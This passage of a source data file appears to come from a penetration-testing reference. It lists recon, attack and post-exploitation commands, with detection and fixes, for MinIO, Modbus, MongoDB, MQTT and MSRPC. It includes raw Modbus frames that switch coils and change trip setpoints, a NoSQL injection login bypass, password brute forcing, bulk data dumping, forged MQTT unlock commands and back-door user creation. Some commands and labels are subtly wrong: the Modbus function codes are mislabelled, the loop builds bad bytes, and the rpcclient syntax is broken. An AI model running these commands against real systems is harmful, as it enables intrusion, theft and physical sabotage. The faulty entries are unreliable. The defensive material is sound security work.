          "mc is the native client and it exposes the administration commands as well, including user management and server status.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 9000,9001 --script http-title,http-headers <target>",
        detail:
          "The API port answers with an XML error that names the service and the region. The console port usually redirects to a login page and shows the product in the page title.",
      },
      {
        title: "Check the health endpoints",
        command: "curl -s http://<target>:9000/minio/health/live\ncurl -s http://<target>:9000/minio/health/cluster",
        detail:
          "The liveness endpoint answers on a healthy node. The cluster endpoint lists the drives, which tells you whether the deployment is a single node or a real cluster.",
      },
      {
        title: "Identify the implementation",
        command: "curl -s -i http://<target>:9000/ | head -20",
        detail:
          "The header block and the XML error body distinguish MinIO from the real AWS S3 endpoint and from a Ceph gateway that implements the same API.",
      },
    ],
    enumeration: [
      {
        title: "List the buckets",
        command: "aws s3 ls --endpoint-url http://<target>:9000",
        detail:
          "The bucket names usually describe the contents in plain language, and each one is a strong hint about what data the organisation holds.",
      },
      {
        title: "List the objects",
        command: "aws s3 ls s3://<bucket> --endpoint-url http://<target>:9000 --recursive",
        detail:
          "Object keys are often full paths with dates and identifiers, so the listing reveals the internal file structure and the naming conventions of the applications.",
      },
      {
        title: "Inspect the cluster with mc",
        command: "mc admin info minio\nmc admin user list minio",
        detail:
          "With valid credentials the admin API reports the drives, the version and the user list, which is the fastest way to understand how the deployment is managed.",
      },
    ],
    attacks: [
      {
        title: "Anonymous bucket access and object download",
        severity: "critical",
        command: "aws s3 ls s3://<bucket> --endpoint-url http://<target>:9000 --recursive",
        detail:
          "A bucket policy that allows s3:GetObject to everyone makes every object readable. Backup buckets and export buckets are the usual casualties.",
        detection:
          "Anonymous ListBucket and GetObject calls in the S3 access log, and access from addresses outside the application set.",
        fix: "Remove public read grants, audit every bucket policy, and treat a bucket that holds backups as a production system with its own access reviews.",
      },
      {
        title: "Default or leaked root credentials",
        severity: "critical",
        command: "mc alias set minio http://<target>:9000 <access-key> <secret-key>\nmc ls minio",
        detail:
          "The root user printed during the first start of a deployment is still in the terminal history of whoever ran it, and the default credentials are documented. Either one gives full control of the object store.",
        detection:
          "Logins using the root account from an address that is not the deployment host, and access key creation events outside the provisioning pipeline.",
        fix: "Rotate the root credentials at deployment, store them in a secret manager, and create separate least privilege users for each application.",
      },
      {
        title: "Overwriting objects in an application bucket",
        severity: "high",
        command: "aws s3 cp ./payload s3://<bucket>/<key> --endpoint-url http://<target>:9000",
        detail:
          "Write access to a bucket that serves application assets means replacing the content everybody downloads. A page that loads your script is a session compromise across every user.",
        detection:
          "PutObject calls for keys that the application does not normally write, and changes to objects that are served to users.",
        fix: "Give writers access only to their own prefix, enable versioning so changes are reversible, and alert on writes to static asset paths.",
      },
    ],
    postEx: [
      {
        title: "Mirror a bucket for bulk exfiltration",
        severity: "high",
        command: "aws s3 sync s3://<bucket> ./loot --endpoint-url http://<target>:9000",
        detail:
          "The sync command walks the bucket and pulls everything down. Backup archives and database dumps come out as ordinary files that can be searched offline.",
        detection:
          "Large volumes of GetObject calls from a new identity and a corresponding outbound transfer to unfamiliar addresses.",
        fix: "Keep buckets private, enable versioning and object lock on backups, and alert on bulk reads by a principal that does not normally read that bucket.",
      },
      {
        title: "Create a durable user for persistence",
        severity: "critical",
        command:
          "mc admin user add minio <user> <password>\nmc admin policy attach minio readwrite --user <user>\nmc admin user list minio",
        detail:
          "The admin API creates users and attaches policies. A user that survives a restart is a durable back door that nobody thinks to look for.",
        detection:
          "User and policy creation events, and console logins by an account outside the provisioning workflow.",
        fix: "Restrict the admin API to a dedicated management network, require the console to sit behind an identity provider, and review the user list on a schedule.",
      },
      {
        title: "Read the configuration and notification targets",
        severity: "medium",
        command:
          "mc admin config get minio\nmc admin bucket remote ls minio/<bucket>",
        detail:
          "The configuration output shows the notification targets, which usually include the bucket or queue that receives every new object, and the credentials for those targets.",
        detection:
          "Admin API calls to the configuration endpoint from an address that is not the deployment host.",
        fix: "Keep the root credentials out of the configuration where possible, and use IAM roles for notification targets instead of static keys.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:9000/minio/health/live", description: "Liveness check for the storage node." },
      { command: "curl -s http://<target>:9000/minio/health/cluster", description: "Cluster and drive status." },
      { command: "aws s3 ls --endpoint-url http://<target>:9000", description: "Lists the buckets." },
      { command: "aws s3 ls s3://<bucket> --endpoint-url http://<target>:9000", description: "Lists the objects in a bucket." },
      { command: "aws s3 cp s3://<bucket>/<key> ./<key> --endpoint-url http://<target>:9000", description: "Downloads a single object." },
      { command: "aws s3 sync s3://<bucket> ./loot --endpoint-url http://<target>:9000", description: "Mirrors a whole bucket to the local disk." },
      { command: "aws s3 cp ./file s3://<bucket>/<key> --endpoint-url http://<target>:9000", description: "Uploads an object." },
      { command: "mc alias set minio http://<target>:9000 <access-key> <secret-key>", description: "Configures the MinIO client alias." },
      { command: "mc admin user list minio", description: "Lists the users on the deployment." },
      { command: "mc admin info minio", description: "Reports the server version and drive layout." },
    ],
    hardening: [
      {
        title: "Change the root credentials at deployment",
        detail:
          "Never run a deployment with the printed or documented default credentials, and store the root key in a secret manager rather than in shell history or a compose file.",
      },
      {
        title: "Make buckets private by default",
        detail:
          "Deny public access at the account level so that a new bucket is private unless somebody deliberately changes it, and review bucket policies regularly.",
      },
      {
        title: "Use per application identities",
        detail:
          "Create a user or a service account per application with access to only the prefix it needs, and rotate those keys on a schedule.",
      },
      {
        title: "Separate the console",
        detail:
          "Put the console on a different port, behind a reverse proxy that requires real authentication, and restrict it to the management network.",
      },
      {
        title: "Enable TLS",
        detail:
          "Serve the API and the console over TLS and require certificate validation on the clients, because the API carries the credentials that unlock everything.",
      },
      {
        title: "Protect the backups",
        detail:
          "Enable versioning and object lock on backup buckets, and keep a copy of the object store somewhere the same credentials cannot reach.",
      },
    ],
    tools: ["nmap", "aws-cli", "mc", "curl", "s3scanner", "metasploit"],
  },
  {
    slug: "modbus",
    name: "Modbus",
    port: 502,
    protocol: "tcp",
    risk: "critical",
    tags: ["ics", "ot", "industrial"],
    summary:
      "Modbus is the protocol that most industrial control systems speak, and it was designed in 1979 for a trusted serial line. The TCP variant has no authentication, no encryption and no session concept, so a single write request changes a physical process. Modbus is therefore judged on physical consequence rather than data loss, and the assessment needs to say so in plain terms. There is no low risk version of this finding, only a smaller or a larger plant.",
    connect: [
      {
        label: "Raw request",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x00\\x00\\x05' | nc -nv <target> 502",
        detail:
          "The bytes are a Modbus TCP read of five holding registers from unit 1. The reply comes back as a binary frame with the values, and there is no handshake to get past.",
      },
      {
        label: "Metasploit scanner",
        command: "msfconsole -q -x 'use auxiliary/scanner/modbus/discover; run rhost=<ip>'",
        detail:
          "The module sends a read to the common unit identifiers and reports the ones that answer, which is a fast way to find the live devices on a segment.",
      },
    ],
    recon: [
      {
        title: "Fingerprint the device",
        command: "nmap -sV -p 502,102,44818,20000 <target>",
        detail:
          "502 is Modbus TCP, 102 is ISO-TSAP for the Siemens family, 44818 is EtherNet/IP and 20000 is DNP3. Several of these protocols share the port in practice, so the first byte of the reply decides what you are talking to.",
      },
      {
        title: "Read the device identification",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x2b\\x0e\\x01\\x00' | nc -nv <target> 502",
        detail:
          "Function code 43 with the device identification object returns the vendor, the product and the revision as readable text, which is the cheapest way to identify the exact model.",
      },
      {
        title: "Enumerate the unit identifiers",
        command: "msfconsole -q -x 'use auxiliary/scanner/modbus/comm_identification; run rhost=<ip>'",
        detail:
          "A plant often exposes several logical devices on one IP, each with its own unit id. Missing one means missing part of the process.",
      },
    ],
    enumeration: [
      {
        title: "Read a block of registers",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x00\\x00\\x08' | nc -nv <target> 502 | xxd",
        detail:
          "Holding registers are the numeric state of the process: temperatures, pressures, setpoints and counters. Eight values are enough to recognise what the device controls.",
      },
      {
        title: "Read the discrete inputs and outputs",
        command:
          "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x01\\x00\\x00\\x00\\x08' | nc -nv <target> 502 | xxd\nprintf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x02\\x00\\x00\\x00\\x08' | nc -nv <target> 502 | xxd",
        detail:
          "Discrete inputs are the read-only sensors and discrete outputs are the states of the actuators. The difference between the two registers shows what the device is currently doing.",
      },
      {
        title: "Find the writable range",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x00\\x00\\xff' | nc -nv <target> 502 | xxd",
        detail:
          "A request for 255 registers either returns a shorter frame or an exception code. The exception tells you the limits the device enforces, which is part of its register map.",
      },
    ],
    attacks: [
      {
        title: "Reading process values and setpoints",
        severity: "high",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x00\\x00\\x0a' | nc -nv <target> 502 | xxd",
        detail:
          "Reading the plant is reconnaissance with real meaning. The values reveal production rates, tank levels and alarm thresholds, and they show an attacker which registers are worth writing to.",
        detection:
          "Modbus traffic from hosts that are not the configured masters, and a request rate that does not match the polling pattern of the normal master.",
        fix: "Restrict Modbus to the master devices at the firewall and enable logging of function codes and unit ids in the industrial firewall.",
      },
      {
        title: "Writing coils and registers",
        severity: "critical",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x05\\x00\\x00\\xff\\x00' | nc -nv <target> 502",
        detail:
          "This single coil write energises an output. Depending on what that output drives it can open a valve, start a motor or release an interlock, and the request has no authentication of any kind.",
        detection:
          "Any write function code from a source that is not a known master, which should be impossible if the firewall rules are correct.",
        fix: "Allow-list the master addresses, deny writes from every other source, and require a change request with a physical verification for any write that changes the process.",
      },
      {
        title: "Unsolicited commands from any host",
        severity: "critical",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x06\\x00\\x10\\x00\\x00' | nc -nv <target> 502",
        detail:
          "Modbus has no concept of a registered master. Any host that can route to port 502 is a master, so one foothold in the industrial network is enough to send commands to the whole plant.",
        detection:
          "New source addresses issuing requests at all, and requests for unit ids that the normal master never polls.",
        fix: "Segment the OT network from the IT network, apply strict source allow lists at the industrial firewall, and remove default routes from the plant equipment.",
      },
    ],
    postEx: [
      {
        title: "Map the register layout",
        severity: "high",
        command:
          "for a in 0000 0010 0020 0030 0040; do printf \"\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x03\\x${a:0:1}\\x${a:1:1}\\x00\\x00\\x00\\x0a\" | nc -nv <target> 502 | xxd; done",
        detail:
          "Walking the register space in blocks of ten produces a table of the process. Note which registers change on their own, because those are measured values, and which ones stay fixed, because those are setpoints.",
        detection:
          "Sequential reads covering wide address ranges, which no normal master does in a single sweep.",
        fix: "Limit the address ranges that clients may read, and monitor for reads that cover ranges the process does not use.",
      },
      {
        title: "Alter a setpoint or a trip threshold",
        severity: "critical",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x06\\x00\\x10\\x00\\x2c' | nc -nv <target> 502",
        detail:
          "Writing a setpoint changes what the plant will do. Moving a trip threshold or a high limit is quieter than switching a pump off, and it can be far more dangerous.",
        detection:
          "Write function codes outside the normal configuration changes, and a process value that no longer matches the operator expectation.",
        fix: "Protect configuration registers with a separate authorisation path, and require a two person rule for changes that affect protective functions.",
      },
      {
        title: "Fingerprint the firmware for known issues",
        severity: "medium",
        command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x2b\\x0e\\x01\\x00' | nc -nv <target> 502 | strings",
        detail:
          "The vendor, product and revision string identifies the firmware exactly. Do the research on the product before touching the plant, because a wrong write is worse than a missing step.",
        detection:
          "This is a read, so the detection signal is the same as for any other read from an unexpected source.",
        fix: "Keep the plant firmware current and check the vendor advisory list against the exact model and revision.",
      },
    ],
    commands: [
      { command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x00\\x00\\x0a' | nc -nv <target> 502", description: "Read ten holding registers (function code 3)." },
      { command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x01\\x00\\x00\\x00\\x08' | nc -nv <target> 502", description: "Read eight discrete inputs, the read-only sensors (function code 1)." },
      { command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x02\\x00\\x00\\x00\\x08' | nc -nv <target> 502", description: "Read eight discrete outputs, the actuator states (function code 2)." },
      { command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x05\\x00\\x00\\xff\\x00' | nc -nv <target> 502", description: "Switch coil 0 on (function code 5)." },
      { command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x06\\x00\\x10\\x00\\x2c' | nc -nv <target> 502", description: "Write 44 into holding register 16 (function code 6)." },
      { command: "printf '\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x2b\\x0e\\x01\\x00' | nc -nv <target> 502", description: "Read the device identification (function code 43, object 14)." },
      { command: "msfconsole -q -x 'use auxiliary/scanner/modbus/discover; run rhost=<ip>'", description: "Metasploit Modbus device discovery." },
      { command: "msfconsole -q -x 'use auxiliary/scanner/modbus/comm_identification; run rhost=<ip>'", description: "Enumerates the unit identifiers on a device." },
      { command: "nmap -sV -p 502 <target>", description: "Fingerprint the device on the Modbus port." },
      { command: "tcpdump -i eth0 -w modbus.pcap 'tcp port 502' -s 0", description: "Capture the traffic for later analysis." },
    ],
    hardening: [
      {
        title: "Segment the plant from the network",
        detail:
          "Modbus must never be routable from a corporate network or from the internet. The industrial zone and the safety zone need separate paths and separate hardware.",
      },
      {
        title: "Allow-list the masters",
        detail:
          "Only the historian, the SCADA server and the engineering station should be permitted to open a session to the plant devices. Everything else is denied at the firewall.",
      },
      {
        title: "Use a protocol aware firewall",
        detail:
          "Deep packet inspection on Modbus lets you allow specific function codes and unit ids, rather than only a source address. That is what stops an accidental write.",
      },
      {
        title: "Configure fail-safe behaviour",
        detail:
          "Set the device to move to a safe state when the connection is lost or the master stops polling, and confirm that behaviour with the process engineers before the assessment.",
      },
      {
        title: "Remove default access",
        detail:
          "Change the default credentials on the devices and their web interfaces, and remove the engineering protocols such as Telnet, FTP and HTTP from the devices themselves.",
      },
      {
        title: "Log and alert on the function codes",
        detail:
          "Record every function code and unit id that crosses the firewall, and alert on write codes from any source other than the expected master.",
      },
    ],
    tools: ["nmap", "netcat", "metasploit", "wireshark", "scapy"],
  },
  {
    slug: "mongodb",
    name: "MongoDB",
    port: 27017,
    protocol: "tcp",
    risk: "critical",
    tags: ["database", "nosql", "document"],
    summary:
      "MongoDB speaks a binary wire protocol but announces itself clearly, and many deployments were shipped for years with authentication switched off. The server also describes its own contents: the first listDatabases call tells you what the application stores and how big it is. On top of that, the query language is a scripting surface, which turns any place where user input reaches a filter into an injection point. Most real incidents are one of the three: an open port, a weak password, or a query built by string concatenation.",
    connect: [
      {
        label: "mongosh",
        command: "mongosh --host <target> --port 27017 --eval 'db.version()'",
        detail:
          "The shell connects without a credential first and tells you whether the server requires one, which makes it a good first probe.",
      },
      {
        label: "Wire protocol check",
        command: "nmap -sV -p 27017 --script mongodb-info,mongodb-databases <target>",
        detail:
          "The scripts report the version, the databases and whether authentication is enabled. mongodb-databases is the one that matters.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 27017 --script mongodb-info,mongodb-databases <target>",
        detail:
          "A server that lists its databases to an anonymous client is the finding, and the names of those databases describe the application in plain language.",
      },
      {
        title: "Check the authentication state",
        command: "mongosh --host <target> --eval 'db.adminCommand({connectionStatus:1})'",
        detail:
          "The authenticatedUsers list tells you whether the session has any privileges at all, and which privileges exactly.",
      },
      {
        title: "Read the startup options",
        command: "mongosh --host <target> --eval 'db.adminCommand({getCmdLineOpts:1})'",
        detail:
          "The options include the bind address, the security settings and the storage paths, which is often the fastest way to see how the server is configured.",
      },
    ],
    enumeration: [
      {
        title: "List the databases",
        command: "mongosh --host <target> --eval 'db.adminCommand({listDatabases:1})'",
        detail:
          "The reply gives the name, the size on disk and the empty flag. A database marked empty but not really empty is a clue about how the application uses it.",
      },
      {
        title: "List the collections",
        command: "mongosh --host <target> --eval 'db.getSiblingDB(\"<database>\").getCollectionNames()'",
        detail:
          "Collection names describe the data model of the application, and they are usually readable without any privilege on most unsecured deployments.",
      },
      {
        title: "List the users and roles",
        command: "mongosh --host <target> --eval 'db.getSiblingDB(\"admin\").system.users.find()'",
        detail:
          "The user list includes the roles each account holds, which is a fast map of who administers the database and who is merely an application.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated database access",
        severity: "critical",
        command: "mongosh --host <target> --eval 'db.adminCommand({listDatabases:1})'",
        detail:
          "With no authentication there is no barrier at all: every collection can be read, modified and dropped, and the administrative commands are available too.",
        detection:
          "Connections from hosts that do not run the application, and administrative commands such as listDatabases coming from a user network.",
        fix: "Enable authorization with SCRAM-SHA-256, bind the service to a private interface, and firewall the port to the application tier.",
      },
      {
        title: "NoSQL injection in the application",
        severity: "critical",
        command: "curl -s 'http://<target>/api/users?username[$ne]=null&password[$ne]=null'",
        detail:
          "Frameworks that turn query parameters into a document let an attacker use operators such as $ne, $gt and $regex to rewrite the filter. An empty result check that only tests for the object means the login is bypassed.",
        detection:
          "Filter errors and unexpected operators arriving at the database, and logins that succeed with no corresponding successful credential check.",
        fix: "Build the query with a typed driver instead of raw request parameters, cast every input, and never pass an unvalidated request body into a filter.",
      },
      {
        title: "Weak or reused database credentials",
        severity: "high",
        command: "medusa -h <target> -u <user> -P /usr/share/wordlists/common-passwords.txt -m mongodb -t 8",
        detail:
          "The wire protocol has a simple and fast authentication exchange, so a password list is cheap to test. Application accounts frequently reuse a database password across environments.",
        detection:
          "Failed authentication attempts in the MongoDB log and a burst of connection attempts from one address.",
        fix: "Use long generated credentials, one user per application, and rotate them through a secret manager rather than storing them in a configuration file.",
      },
    ],
    postEx: [
      {
        title: "Dump the database",
        severity: "critical",
        command: "mongodump --host <target> --port 27017 --out ./dump",
        detail:
          "The logical dump produces BSON files that can be searched with any tool, which is far more useful than reading documents one at a time through the shell.",
        detection:
          "Large sustained reads from a new client identity, and a dump that touches collections in a pattern no application uses.",
        fix: "Restrict the application account to the collections it needs, monitor read volume per user, and keep a copy of the audit log for investigation.",
      },
      {
        title: "Search the data for secrets",
        severity: "high",
        command:
          "mongosh --host <target> --eval 'db.getSiblingDB(\"<database>\").users.find({$or:[{password:{$exists:true}},{token:{$exists:true}}]}).toArray()'",
        detail:
          "Documents that hold a password or a token field often hold them in clear text, and the same database frequently stores the application's own session and integration secrets.",
        detection:
          "A query pattern that touches authentication related fields from an account that does not normally read them.",
        fix: "Hash passwords with a modern algorithm and never store raw tokens, and audit which application accounts can read the user collections.",
      },
      {
        title: "Harvest the server configuration",
        severity: "medium",
        command:
          "mongosh --host <target> --eval 'db.adminCommand({getCmdLineOpts:1})'\nmongosh --host <target> --eval 'db.serverStatus().security'",
        detail:
          "The command line options and the security block show the authentication mode, the TLS requirement and the key file locations, which tells you whether the deployment is secure or merely believed to be.",
        detection:
          "Administrative commands issued from a host that is not the deployment or maintenance server.",
        fix: "Keep the admin account for administration only, use a dedicated account for the application, and record every use of the admin commands.",
      },
    ],
    commands: [
      { command: "mongosh --host <target> --port 27017 --eval 'db.version()'", description: "Returns the server version." },
      { command: "mongosh --host <target> --eval 'db.adminCommand({listDatabases:1})'", description: "Lists every database with its size." },
      { command: "mongosh --host <target> --eval 'db.getSiblingDB(\"admin\").system.users.find()'", description: "Lists the database users and their roles." },
      { command: "mongosh --host <target> --eval 'db.currentOp()'", description: "Shows the operations running right now." },
      { command: "mongosh --host <target> --eval 'db.serverStatus()'", description: "Server status including connections and memory." },
      { command: "mongosh --host <target> --eval 'db.adminCommand({connectionStatus:1})'", description: "Shows whether the current session is authenticated and what it may do." },
      { command: "mongosh --host <target> --eval 'db.adminCommand({getCmdLineOpts:1})'", description: "Prints the startup options of the server." },
      { command: "mongodump --host <target> --port 27017 --out ./dump", description: "Takes a full logical dump of the server." },
      { command: "mongoexport --host <target> --db <database> --collection <collection> --out ./data.json", description: "Exports one collection to JSON." },
      { command: "nmap -p 27017 --script mongodb-info,mongodb-databases,mongodb-brute <target>", description: "Fingerprints, lists and brute forces the server." },
    ],
    hardening: [
      {
        title: "Enable authentication",
        detail:
          "Turn on authorization with SCRAM-SHA-256 and create one account per application with only the privileges that application needs.",
      },
      {
        title: "Bind it to a private interface",
        detail:
          "Set the bind address to the internal interface and firewall port 27017 so that only the application tier and the administrators can reach it.",
      },
      {
        title: "Require TLS",
        detail:
          "Set the TLS mode to requireTLS with a certificate the clients validate. The wire protocol carries the authentication exchange in a form that should not cross a network in clear text.",
      },
      {
        title: "Never build filters from raw input",
        detail:
          "Use the typed driver, validate every field against an allow list of operators, and treat the query language as a scripting surface in code review.",
      },
      {
        title: "Encrypt the data files",
        detail:
          "Enable encryption at rest and keep the key file outside the data directory, protected by the service account and backed up securely.",
      },
      {
        title: "Audit the administrative commands",
        detail:
          "Turn on database profiling and audit logging, and review listDatabases, drop and createIndex commands as the events worth an alert.",
      },
    ],
    tools: ["nmap", "mongosh", "mongodump", "medusa", "metasploit", "burpsuite"],
  },
  {
    slug: "mqtt",
    name: "MQTT",
    port: 1883,
    protocol: "tcp",
    risk: "high",
    tags: ["messaging", "iot", "publish-subscribe"],
    summary:
      "MQTT is the publish and subscribe protocol used by connected devices, building systems and home automation. The broker is the only component, and its authorisation model is the topic: a client that can subscribe can usually subscribe to everything. There is very little built in, so a broker that was deployed quickly often allows anonymous clients and unrestricted publishing. The consequences are privacy failures when you read the telemetry and safety failures when you write the command.",
    connect: [
      {
        label: "mosquitto_sub",
        command: "mosquitto_sub -h <target> -p 1883 -t '#' -v -W 10",
        detail:
          "The wildcard topic subscribes to everything. If messages arrive, the broker has no effective authorisation for reading.",
      },
      {
        label: "mosquitto_pub",
        command: "mosquitto_pub -h <target> -p 1883 -t 'test/probe' -m 'probe' -v",
        detail:
          "The publish returns a confirmation when the broker accepted the message, which distinguishes a connected broker from a silent port.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 1883,8883 --script mqtt-info <target>",
        detail:
          "The mqtt-info script connects, subscribes to the system topics and prints the broker's own version and status information.",
      },
      {
        title: "Read the broker version",
        command: "mosquitto_sub -h <target> -p 1883 -t '$SYS/broker/version' -C 1 -W 5",
        detail:
          "The system topic tree is published by the broker itself and it reveals the implementation and the version, which decides which advisories apply.",
      },
      {
        title: "Check the TLS listener",
        command: "openssl s_client -connect <target>:8883 -brief </dev/null",
        detail:
          "Many brokers listen on 8883 as well. If it is absent, the credentials and the payloads are crossing the network in clear text on 1883.",
      },
    ],
    enumeration: [
      {
        title: "Subscribe to the whole tree",
        command: "mosquitto_sub -h <target> -p 1883 -t '#' -v -W 30 | head -50",
        detail:
          "The topic names and payloads describe the estate: device identifiers, room names, telemetry values and occasionally credentials.",
      },
      {
        title: "Target a topic tree",
        command: "mosquitto_sub -h <target> -p 1883 -t 'devices/+/status' -v",
        detail:
          "A wildcard in the middle of a topic still covers every device of that type, which is enough to build an inventory of the fleet.",
      },
      {
        title: "Count the connected clients",
        command: "mosquitto_sub -h <target> -p 1883 -t '$SYS/broker/clients/connected' -C 1 -W 5",
        detail:
          "The system topics report the client count and the message rate, which tells you whether this is a lab broker or a live one.",
      },
    ],
    attacks: [
      {
        title: "Reading every topic",
        severity: "high",
        command: "mosquitto_sub -h <target> -p 1883 -t '#' -v -W 30",
        detail:
          "Without authentication the broker hands over the entire message stream. Telemetry contains occupancy, presence and usage patterns, and some deployments also publish configuration and credentials.",
        detection:
          "Subscriptions from clients that are not in the device inventory, and a client count that does not match the number of known devices.",
        fix: "Require a credential per client, deny anonymous clients, and use topic ACLs so that each device can only read and write its own topics.",
      },
      {
        title: "Publishing forged device commands",
        severity: "critical",
        command: "mosquitto_pub -h <target> -p 1883 -t 'devices/<device>/cmd' -m '{\"action\":\"unlock\"}' -q 1",
        detail:
          "Write access is the dangerous half. A forged command can open a door, disable an alarm, change a setpoint or reset a device, and the device has no way of telling a legitimate command from an injected one.",
        detection:
          "Publish requests from clients outside the device set, and commands arriving at a device that are not in the expected sequence.",
        fix: "Give devices write access to their own command topics only, sign commands where the device can verify them, and separate command topics from telemetry.",
      },
      {
        title: "Credential reuse across device fleets",
        severity: "high",
        command: "medusa -h <target> -u <user> -P /usr/share/wordlists/common-passwords.txt -m mqtt -t 8",
        detail:
          "Device credentials are often a default password or a serial number, and they are frequently shared across the whole fleet. One credential opens every device.",
        detection:
          "Successful authentications from an address that is not a known device, and the same client identifier connecting from two places.",
        fix: "Provision a unique credential per device, store it in the device hardware store rather than in firmware, and rotate it on a schedule.",
      },
    ],
    postEx: [
      {
        title: "Harvest credentials published on topics",
        severity: "high",
        command: "mosquitto_sub -h <target> -p 1883 -t '#' -v -W 60 | grep -iE 'password|token|secret|apikey|authorization'",
        detail:
          "Devices publish their own configuration during commissioning and when they report status, and those messages frequently contain a shared secret or a cloud token.",
        detection:
          "A subscription pattern that follows a specific credential across many devices, which shows up once the payloads are inspected.",
        fix: "Keep credentials out of the telemetry, encrypt the payloads, and rotate anything that has been published.",
      },
      {
        title: "Replay a captured command",
        severity: "high",
        command: "mosquitto_pub -h <target> -p 1883 -t 'devices/<device>/cmd' -m '<captured-payload>' -q 1",
        detail:
          "A command captured from a legitimate client can be sent again by hand. Replaying a door or an override command is often enough without needing any write credential.",
        detection:
          "A command arriving twice within a short window, or a command with a different publisher identifier than the device expects.",
        fix: "Include a sequence number and a timestamp in every command and have the device reject anything stale or repeated.",
      },
      {
        title: "Enumerate the device fleet from topic names",
        severity: "medium",
        command: "mosquitto_sub -h <target> -p 1883 -t '#' -v -W 120 | cut -d' ' -f1 | sort -u",
        detail:
          "The set of topic names is the device list. It gives the model of each device, the site it is in and the version, which is the input for the firmware research that follows.",
        detection:
          "The signal is a broad subscription from an address that is not a device.",
        fix: "Namespace topics per site and treat the topic structure as part of the security design rather than an implementation detail.",
      },
    ],
    commands: [
      { command: "mosquitto_sub -h <target> -t '#' -v -W 5", description: "Subscribes to every topic for five seconds." },
      { command: "mosquitto_sub -h <target> -t '$SYS/broker/version' -C 1", description: "Reads the broker version from the system topics." },
      { command: "mosquitto_sub -h <target> -t 'devices/+/status' -v", description: "Wildcard subscription across a device family." },
      { command: "mosquitto_pub -h <target> -t 'test' -m 'hello'", description: "Publishes a message." },
      { command: "mosquitto_pub -h <target> -u <user> -P <password> -t 'test' -m 'hello'", description: "Publishes with a credential." },
      { command: "mosquitto_pub -h <target> -t 'test' -m 'hello' -q 2", description: "Publishes at quality of service 2, which is acknowledged." },
      { command: "mosquitto_pub -h <target> -t 'test' -m 'hello' -r", description: "Publishes a retained message, which new subscribers receive immediately." },
      { command: "mosquitto_pub -h <target> -t 'test' -m 'hello' -d", description: "Shows the publish packet as it goes on the wire." },
      { command: "mosquitto_sub -h <target> -t '$SYS/broker/clients/connected' -C 1", description: "Reports the number of connected clients." },
      { command: "nmap -p 1883 --script mqtt-info,mqtt-subscribe <target>", description: "Nmap scripts that fingerprint the broker and list the topics." },
    ],
    hardening: [
      {
        title: "Disable anonymous clients",
        detail:
          "Set allow_anonymous to false and give every device and application its own credential, so that a revoked device does not take the whole broker with it.",
      },
      {
        title: "Write topic ACLs",
        detail:
          "A topic ACL is the only authorisation layer here. Define per device read and write rights and review them when the fleet changes.",
      },
      {
        title: "Require TLS",
        detail:
          "Serve the broker on 8883 with TLS and require certificate validation, because device credentials are long lived and the payloads are private.",
      },
      {
        title: "Keep the broker off the internet",
        detail:
          "Expose it through a gateway with authentication rather than publishing 1883 directly. Anonymous brokers are one of the most searched for exposures on the internet.",
      },
      {
        title: "Rotate the credentials",
        detail:
          "Change device credentials on a schedule and whenever a device is replaced, and store them in the hardware rather than in firmware where they survive the whole life of the product.",
      },
      {
        title: "Watch the topic patterns",
        detail:
          "Alert on wildcard subscriptions, on retained messages written by unexpected clients and on a sudden rise in publish volume.",
      },
    ],
    tools: ["nmap", "mosquitto-sub", "mosquitto-pub", "netcat", "wireshark", "medusa"],
  },
  {
    slug: "msrpc",
    name: "MSRPC",
    port: 135,
    protocol: "tcp",
    risk: "high",
    tags: ["windows", "rpc", "active-directory"],
    summary:
      "The RPC endpoint mapper on port 135 is the front door to every remote procedure call interface on a Windows host. It exists so that a client can ask which port serves a given interface and then connect there, which means one port leads to the whole RPC surface of a machine. Several historically serious Windows vulnerabilities live in those interfaces, so enumerating them is not academic. None of it needs a credential to start with.",
    connect: [
      {
        label: "Endpoint mapper",
        command: "nmap -sV -p 135 --script rpcinfo <target>",
        detail:
          "The script performs the endpoint mapper request and prints the registered interfaces with their versions and ports.",
      },
      {
        label: "rpcclient",
        command: "rpcclient -U '' -N -S 'nc -nv <target> 445' <target> -c 'srvinfo'",
        detail:
          "rpcclient uses an SMB named pipe as its transport, which is how the interfaces are actually reached. The -N flag means an empty password.",
      },
    ],
    recon: [
      {
        title: "Enumerate the interfaces",
        command: "nmap -sV -p 135 --script rpcinfo <target>",
        detail:
          "The reply lists interface UUIDs and versions. Each UUID maps to a known protocol and to a known set of vulnerabilities, which is what makes this useful.",
      },
      {
        title: "Sweep the dynamic port range",
        command: "nmap -sV -p 135,49152-65535 --script msrpc-enum <target>",
        detail:
          "The interfaces usually live in the dynamic range, so enumerating port 135 alone tells you nothing about what is listening.",
      },
      {
        title: "Read the server information",
        command: "rpcclient -U '' -N -S 'nc -nv <target> 445' <target> -c 'srvinfo'",
        detail:
          "The srvinfo call returns the server name, the OS version and the domain, which is a good way to confirm the target before doing anything else.",
      },
    ],
    enumeration: [
      {
        title: "Dump the RPC table",
        command: "impacket-rpcdump -target-ip <target>",
        detail:
